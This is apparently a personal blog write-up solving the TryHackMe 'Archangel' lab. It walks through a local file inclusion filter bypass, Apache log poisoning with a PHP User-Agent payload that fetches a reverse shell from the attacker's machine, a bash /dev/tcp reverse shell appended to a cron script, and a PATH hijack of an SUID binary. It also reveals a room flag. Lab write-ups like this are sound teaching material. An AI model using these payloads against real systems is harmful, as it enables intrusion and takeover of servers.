---
title: "TryHackMe - Archangel"
author: Nasrallah
description: ""
date: 2022-09-19 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, lfi, logpoisoning]
img_path: /assets/img/tryhackme/archangel
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Archangel](https://tryhackme.com/room/archangel) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.8.3
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have ssh running on port 22 and an Apache web server on port 80.

### Web

Let's navigate to the web page.

![](1.png)

Nothing interesting here except of the email which has the domain `mafialive.thm`, let's add that to the **/etc/hosts** file.

![](2.png)

Now let's go `http://mafialive.thm`.

![](3.png)

Got the first flag. Let's run a directory scan

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://mafialive.thm | tee scans/gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/06 06:31:16 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/robots.txt           (Status: 200) [Size: 34] 
/server-status        (Status: 403) [Size: 278]
                                               
===============================================================
```

Let's check robots.txt file.

![](4.png)

We found test.php, let's check it out `http://mafialive.thm/test.php`.

![](5.png)

There is a button that when we click it, it prints a text.

![](6.png)

We see in the URL that there is a view parameter that includes the file mrrobot.php, this can give a potential Local File Inclusion vulnerability.

I tried including **/etc/passwd** but that's not allowed, let's try read base64 encode the test.php file and see what can we do.

`php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

Let's navigate to the following URL.

```text
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

![](7.png)

Great! We got the php code, let's decode it and see what it does.

```php
	
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>

```

In order for the view parameter to work, it should not contains `../..` and it should have `/var/www/html/development_testing` in the request.

We can bypass the first condition by using `..//..` instead.

Our payload would look like the following.

```text
/var/www/html/development_testing//..//..//..//..//etc/passwd
```

Let's put our payload in the view parameter.

![](8.png)

We managed to read the passwd file and confirmed the LFI vulnerability.

## **Foothold**

### Log Poisoning

We know that the web server is Apache, so we're going to use a technique called `log poisoning`. For more information, check this [article](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/).

The file we're going to poison is `/var/log/apache2/access.log`. We can access it through the lfi with the following payload.

```text
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//log/apache2/access.log
```

![](9.png)

We are going to put a php code that would upload a php reverse shell we're going to serve on our attacking machine.

The reverse shell we'll be using is [Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)'s.

We server the file with a python http server `sudo python3 -m http.server 80`.

For the log poisoning part, we're going to replace our user-agent header with a php code that's going to upload the reverse shell to the web server.

```php
<?php file_put_contents('shell.php',file_get_contents('http://10.11.10.10/shell.php'))?>
```

Now we can request the test.php page for example and put the code above as our user-agent.

```bash
curl http://mafialive.thm/test.php -A "<?php file_put_contents('shell.php',file_get_contents('http://10.11.31.131/shell.php'))?>" 
```

![](10.png)

To trigger the php code, we run the following command that requests the access.log file.

```bash
curl http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//log/apache2/access.log 
```

We can see that our reverse shell got uploaded successfully.

Now we setup a listener on our machine with `nc -lvnp 1234` and request the shell.php file we uploaded.

![](11.png)

Great! We got a shell.

## **Privilege Escalation**

After some basic enumeration, we found the following shell script.

![](12.png)

After checking the cronjobs, we find out that the file get's executed every minute.

Lucky for us, we have write permission on the file, so we can add a command that sends us a shell as `archangel`.

```bash
echo "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1" >> /opt/helloworld.sh
```

![](13.png)

After setting up another listener, we receive a shell as user `archangel`.

Let's stabilize our shell with python pty and see what we can find.

![](14.png)

The is a file owned by root and has an suid bit. Let's run it.

![](15.png)

We see that the file use `cp` without any file path like `/bin/cp`.

We can exploit that by copying /bin/bash to /tmp and named `cp`. We add /tmp directory to the $PATH variable and execute the program to get shell.

```bash
cp /bin/bash /tmp/cp
chmod 777 /tmp/cp
export PATH=/tmp:$PATH
./backup
```

![](16.png)

We got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
